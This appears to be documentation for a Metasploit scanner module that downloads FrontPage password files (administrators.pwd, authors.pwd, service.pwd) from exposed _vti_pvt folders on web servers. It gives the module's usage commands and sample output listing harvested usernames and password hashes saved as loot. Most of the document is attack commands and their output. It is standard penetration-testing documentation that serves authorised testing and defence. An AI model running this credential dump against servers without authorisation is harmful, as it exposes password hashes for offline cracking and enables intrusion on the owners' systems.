## Description
When Microsoft FrontPage is run on a non-IIS web server it creates encrypted password files in the _vti_pvt folder. When this folder is accessible, these files can be downloaded and parsed to obtain encrytped passwords. These encrypted passwords can then be cracked offline and used to gain further access to the server.

Affected Files:

 * administrators.pwd
 * authors.pwd
 * service.pwd

Citations:
 * https://msdn.microsoft.com/en-us/library/cc750050.aspx
 * http://sparty.secniche.org/

## Usage
```
use auxiliary/scanner/http/frontpage_credential_dump
set RHOSTS 10.10.10.10
set TARGETURI about
run
```

## Standard Output
```
msf auxiliary(scanner/http/frontpage_credential_dump) > run

[+] 10.10.10.10 - service.pwd
[+] 10.10.10.10 - administrators.pwd
[+] 10.10.10.10 - authors.pwd

FrontPage Credentials
=====================

 Source          Username    Password Hash
 ------          --------    -------------
 Administrators  e-scan.com  xMyvw4d3c1oWY
 Authors         e-scan.com  xMyvw4d3c1oWY
 Service         e-scan.com  jLAsITPJ8AsaR

[*] Credentials saved in: /root/.msf4/loot/20180921124147_default_10.10.10.10_frontpage.creds_096592.txt

```

## Verbose Output
```
msf auxiliary(scanner/http/frontpage_credential_dump) > run

[*] Requesting: /about/_vti_pvt/service.pwd
[*] Found /about/_vti_pvt/service.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - service.pwd
[*] Requesting: /about/_vti_pvt/administrators.pwd
[*] Found /about/_vti_pvt/administrators.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - administrators.pwd
[*] Requesting: /about/_vti_pvt/authors.pwd
[*] Found /about/_vti_pvt/authors.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - authors.pwd

FrontPage Credentials
=====================

 Source          Username    Password Hash
 ------          --------    -------------
 Administrators  e-scan.com  xMyvw4d3c1oWY
 Authors         e-scan.com  xMyvw4d3c1oWY
 Service         e-scan.com  jLAsITPJ8AsaR

[*] Credentials saved in: /root/.msf4/loot/20180921124828_default_10.10.10.10_frontpage.creds_090555.txt
```
